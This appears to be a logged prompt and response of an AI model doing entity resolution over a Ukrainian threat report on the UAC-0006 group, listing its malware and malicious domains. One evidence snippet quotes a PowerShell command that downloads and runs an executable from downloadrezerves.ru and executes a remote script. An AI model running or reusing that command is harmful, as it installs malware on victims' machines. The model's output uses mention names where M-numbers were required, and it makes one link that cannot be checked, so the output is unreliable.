=== REQUEST (ollama gemma4:31b) ===
--- instructions ---
You are an entity-resolution judge for an incremental entity registry. For every mention you decide one thing: which entity it is. Hierarchy between entities is decided elsewhere — never answer it here.

The source lists its known entities once, as `E1…En`. Every mention names the subset of those entities that plausibly match it. Use the numbers; never write a name where a number is asked for. A mention may carry a `ctx:` reference naming the evidence window(s) (`S1. …`) that contain it.

## 1. `id` — identity (exact match)

Answer `"NEW"` when the mention refers to an entity that is none of its listed options; otherwise the option's `E` number. Only choose an existing entity when the supplied names and aliases support identity. Category, role, behavior, relationships, co-occurrence, and thematic similarity are NOT identity evidence. The order of options is retrieval score, which is not evidence.

Same entity — the names differ only in written form:

- a vendor, publisher, or organization prefix present in one ("Acme Foo" / "Foo");
- spacing, punctuation, hyphenation, case ("FooBar" / "Foo Bar");
- a parenthetical or bracketed descriptor ("foo (the loader used here)" / "foo");
- a file extension, platform, or implementation suffix ("foo.bin" / "foo", "Foo .NET" / "Foo");
- a generic type word stating only what kind of thing it is ("Foo tool" / "Foo");
- an acronym beside its own expansion;
- a transliteration or translation of the same proper name.

Different entities, however related — version, edition, year or identifier differs; one is a part, component or member of the other; one is a file or artifact and the other the program that made it; the base names differ. When names are alike except for an identifier or a number, match those characters exactly and never choose an option whose identifier differs. When a name pairs a structured identifier with a descriptive label — in either order, one of them usually bracketed ("K-12 (Foo)", "Foo (K-12)") — the identifier is what the name identifies. Choose the option carrying that identifier, and treat the bare label on its own as a different, broader entity.

If in doubt, answer `"NEW"`: a duplicate is repairable, a wrong merge is not.

## 2. `g` — gloss

For every mention you did NOT link, one short factual description — at most twelve words, grounded in the source, **not restating the name**. It is used to retrieve this entity later, never as identity evidence. Use `null` when the source says nothing descriptive.

## Output

Source context bears on identity only, and only where it explicitly establishes an alias, identifier, transliteration, abbreviation, or unambiguous co-reference.

Output one raw JSON object per line (JSONL), no markdown fences, no commentary, no wrapping array, one line per mention, in order, keys exactly `m`, `id`, `g`:
{"m":"M1","id":"E3","g":null}
{"m":"M2","id":"NEW","g":"a 2010 release of the suite"}

--- text ---
Source: "Зведена інформація щодо діяльності угрупування UAC-0006 станом на 01.12.2023" — evidence: S1. "ння інфікованим комп'ютером здійснюється із застосуванням, щонайменше, 13 різновидів спеціалізованих програм, зокрема:</p><ul><li>SMOKELOADER</li><li>LOADERX3</li><li>RMS</li><li>RDPWRAPPER</li><li>DANABOT</li><li>LUMMASTEALER</li><li>REDLINESTEALER</li><li>SYSTEMBC</li><li>TALESHOT</li><li>PIEJET</li><li>LOADNEST</li><li>HANGTHREAD</li><li>BACKSTAB</li><li>AUKILL</li></ul><p><br></p><p>Загалом, після первинного ураження ЕОМ і доставки SMOKELOADER, останній використовується для завантаження і запуску на ЕОМ інш" S2. "utionPolicy Bypass -File %TMP%\pssD713.ps1 $path = $Env:temp+'\AsmLUkHt.exe'; $client = New-Object System.Net.WebClient; $client.downloadfile('hXXp://downloadrezerves.ru/download11/mstsc.exe',$path); Start-Process -FilePath $path IEX (New-Object Net.Webclient).downloadstring("hXXp://downloadrezerves.ru/index.php") %SY"
Entities:
E1. LoadEdge
E121. cdn.discordapp.com
E122. humanitarydp.ru
E123. oon24opros.yolasite.com
E124. edopomogaonline.yolasite.com
E125. protonmail.com
E126. mail.aet.in.ua
E127. filetransrediremin.com
E128. kismamabeforyougo.ru
E129. kissmafiabeforyoudied.ru
E130. infomailforyoumak.ru
E131. atomydoc.kg
E132. goodlenuxilam.site
E133. msp.gov.ua
E134. eumr.site
E135. mail.lebsack.de
E136. krasavchikoleg.net
E137. telsec.org
E138. telegram.org.security.ohsxy.com
E139. security-check.telegram.org.ohsxy.com
E140. pbank.co.ua
E141. sismasterhome.ru
E142. superops.ai
E143. supermarioprohozhdenie.ru
E144. superops.com
E145. zallesman.ru
E146. againandagaingmorder.ru
E147. bloockflad.pw
E148. bluepablo.fun
E149. boddyshow.fun
E150. bookgames.pw
E151. comperssw.fun
E152. coudzoom.ru
E153. dayzilons.pw
E154. downloadrezerves.ru
E155. duhodown.fun
E156. howlcars.fun
E157. keewoolas.pw
E158. killredls.pw
E159. kowersize.fun
E160. monopoliafromyou.ru
E161. moskhoods.pw
E162. mouseoiet.fun
E163. plengreg.fun
E164. revivalsecularas.pw
E165. rms-server.tektonit.ru
E166. steycools.pw
E167. superdadymster.ru
E168. unayt.ru
E169. zamesblack.fun
E170. cafeteriumups.ru
E171. africathrillthes.pw
E172. Ukrainian energy sector
E173. Ukrainian providers [aka Ukrainian telecommunications providers]
E174. Ukrainian organizations
E175. державні установи та підприємства
E176. Бухгалтери підприємств
E177. державні органи України [aka Ukrainian government sector, державні організації України]
E178. Ukrainian media organizations
E179. громадяни України
E180. Financial institutions
E181. Drupal-based websites
Mentions:
M1. "LOADERX3" (Software) — options: E1, E2, E3, E4 — ctx: S1
M2. "RMS" (Software) — options: E11, E12, E13, E7 — ctx: S1
M3. "RDPWRAPPER" (Software) — options: E19, E20, E21, E10 — ctx: S1
M4. "DANABOT" (Software) — options: E22, E25, E26, E27 — ctx: S1
M5. "REDLINESTEALER" (Software) — options: E31, E32, E33, E5 — ctx: S1
M6. "SYSTEMBC" (Software) — options: E16, E36, E37, E11 — ctx: S1
M7. "TALESHOT" (Software) — options: E27, E25, E42, E2 — ctx: S1
M8. "PIEJET" (Software) — options: E2, E44, E45, E16 — ctx: S1
M9. "LOADNEST" (Software) — options: E1, E3, E7, E40 — ctx: S1
M10. "HANGTHREAD" (Software) — options: E27, E26, E49, E16 — ctx: S1
M11. "BACKSTAB" (Software) — options: E7, E53, E54, E2 — ctx: S1
M12. "AUKILL" (Software) — options: E2, E28, E59, E27 — ctx: S1
M13. "africathrillthes.pw" (Domain) — options: E76, E77, E78, E79
M14. "againandagaingmorder.ru" (Domain) — options: E86, E81, E87, E78
M15. "bloockflad.pw" (Domain) — options: E83, E77, E92, E93
M16. "bluepablo.fun" (Domain) — options: E91, E99, E83, E100
M17. "boddyshow.fun" (Domain) — options: E91, E99, E83, E100
M18. "bookgames.pw" (Domain) — options: E92, E77, E106, E98
M19. "comperssw.fun" (Domain) — options: E92, E80, E109, E99
M20. "coudzoom.ru" (Domain) — options: E97, E81, E110, E92
M21. "dayzilons.pw" (Domain) — options: E77, E83, E113, E114
M22. "downloadrezerves.ru" (Domain) — options: E118, E81, E119, E78 — ctx: S2
M23. "duhodown.fun" (Domain) — options: E91, E99, E119, E83
M24. "howlcars.fun" (Domain) — options: E91, E99, E83, E100
M25. "keewoolas.pw" (Domain) — options: E77, E92, E89, E123
M26. "killredls.pw" (Domain) — options: E77, E117, E83, E103
M27. "kowersize.fun" (Domain) — options: E91, E99, E83, E100
M28. "monopoliafromyou.ru" (Domain) — options: E89, E81, E128, E129
M29. "moskhoods.pw" (Domain) — options: E77, E92, E89, E132
M30. "mouseoiet.fun" (Domain) — options: E91, E99, E83, E100
M31. "plengreg.fun" (Domain) — options: E83, E99, E91, E100
M32. "revivalsecularas.pw" (Domain) — options: E77, E137, E134, E117
M33. "rms-server.tektonit.ru" (Domain) — options: E134, E141, E120, E81
M34. "steycools.pw" (Domain) — options: E77, E89, E83, E92
M35. "superdadymster.ru" (Domain) — options: E143, E81, E87, E86
M36. "unayt.ru" (Domain) — options: E134, E81, E117, E92
M37. "zamesblack.fun" (Domain) — options: E91, E145, E135, E99
M38. "cafeteriumups.ru" (Domain) — options: E134, E81, E89, E86
M39. "Ukrainian enterprises" (Sector) — options: E172, E173, E174, E175

=== RESPONSE (19.3s, in 4480 / out 6643 tok, stop) ===
{"m":"LOADERX3","id":"NEW","g":"specialized program used by UAC-0006"}
{"m":"RMS","id":"NEW","g":"specialized program used by UAC-0006"}
{"m":"RDPWRAPPER","id":"E19","g":null}
{"m":"DANABOT","id":"NEW","g":"specialized program used by UAC-0006"}
{"m":"REDLINESTEALER","id":"NEW","g":"specialized program used by UAC-0006"}
{"m":"SYSTEMBC","id":"NEW","g":"specialized program used by UAC-0006"}
{"m":"TALESHOT","id":"NEW","g":"specialized program used by UAC-0006"}
{"m":"PIEJET","id":"NEW","g":"specialized program used by UAC-0006"}
{"m":"LOADNEST","id":"NEW","g":"specialized program used by UAC-0006"}
{"m":"HANGTHREAD","id":"NEW","g":"specialized program used by UAC-0006"}
{"m":"BACKSTAB","id":"NEW","g":"specialized program used by UAC-0006"}
{"m":"AUKILL","id":"NEW","g":"specialized program used by UAC-0006"}
{"m":"africathrillthes.pw","id":"NEW","g":null}
{"m":"againandagaingmorder.ru","id":"NEW","g":null}
{"m":"bloockflad.pw","id":"NEW","g":null}
{"m":"bluepablo.fun","id":"NEW","g":null}
{"m":"boddyshow.fun","id":"NEW","g":null}
{"m":"bookgames.pw","id":"NEW","g":null}
{"m":"comperssw.fun","id":"NEW","g":null}
{"m":"coudzoom.ru","id":"NEW","g":null}
{"m":"dayzilons.pw","id":"NEW","g":null}
{"m":"downloadrezerves.ru","id":"NEW","g":null}
{"m":"duhodown.fun","id":"NEW","g":null}
{"m":"howlcars.fun","id":"NEW","g":null}
{"m":"keewoolas.pw","id":"NEW","g":null}
{"m":"killredls.pw","id":"NEW","g":null}
{"m":"kowersize.fun","id":"NEW","g":null}
{"m":"monopoliafromyou.ru","id":"NEW","g":null}
{"m":"moskhoods.pw","id":"NEW","g":null}
{"m":"mouseoiet.fun","id":"NEW","g":null}
{"m":"plengreg.fun","id":"NEW","g":null}
{"m":"revivalsecularas.pw","id":"NEW","g":null}
{"m":"rms-server.tektonit.ru","id":"NEW","g":null}
{"m":"steycools.pw","id":"NEW","g":null}
{"m":"superdadymster.ru","id":"NEW","g":null}
{"m":"unayt.ru","id":"NEW","g":null}
{"m":"zamesblack.fun","id":"NEW","g":null}
{"m":"cafeteriumups.ru","id":"NEW","g":null}
{"m":"Ukrainian enterprises","id":"NEW","g":"Ukrainian businesses or companies"}
